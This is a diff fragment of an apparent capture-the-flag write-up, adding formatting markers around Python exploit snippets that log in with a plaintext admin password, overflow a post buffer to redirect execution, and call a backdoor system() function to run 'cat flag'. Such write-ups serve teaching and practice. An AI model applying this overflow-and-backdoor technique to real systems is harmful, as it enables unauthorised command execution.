@@ -7,6 +7,8 @@ We start by jumping to admin since password is in plaintext.
 
 To execute our code we need to display the post (so that the buffer is overflown) and then exit (changes rip).
 
+[+]--------------------------Python Code--------------------------[+]
+
 p = interact.Process()
 data = p.readuntil('choice:')
 #Create Post
@@ -23,6 +25,8 @@ p.sendline(b'2')
 p.sendline(b'l0ln0onewillguessth1s')
 p.sendline('\n')
 
+[-]--------------------------Python Code--------------------------[-]
+
 The second part we notice by testing that luckily the rdi (first argument to a function) is alredy 1 which we can abuse if we use it as argument to the backdoor function since it uses
 the system function where we can run commands. 
 
@@ -30,6 +34,8 @@ The only problem is rsi. We also notice that rsi is set to the name of the serve
 the first jump (no login). 
 
 We can change the server name with a 0 (look at c code), to 'cat flag' and then try to run the function.
+
+[+]--------------------------Python Code--------------------------[+]
 
 #Admin menu
 p.sendline(b'0')
@@ -48,6 +54,8 @@ p.sendline('\n')
 #Exit
 p.sendline(b'2')
 p.interactive()
+
+[-]--------------------------Python Code--------------------------[-]
 
 Combined exploit can be downloaded.
 
